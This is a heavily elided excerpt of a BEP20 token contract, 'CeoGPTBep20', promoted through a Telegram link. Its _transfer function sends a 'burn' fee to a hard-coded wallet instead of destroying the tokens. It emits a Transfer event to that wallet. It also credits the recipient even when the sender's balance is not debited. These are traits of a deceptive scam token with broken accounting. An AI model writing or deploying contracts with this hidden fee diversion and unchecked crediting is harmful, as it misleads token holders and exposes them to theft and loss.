...
// Submitted for Telegram: https://t.me/ceogptbsc
...
contract  CeoGPTBep20  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x8e4dBd94170E1f41D30A5A20d7fD47C6868bEDb8] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x8e4dBd94170E1f41D30A5A20d7fD47C6868bEDb8, _bruntoken);
        }
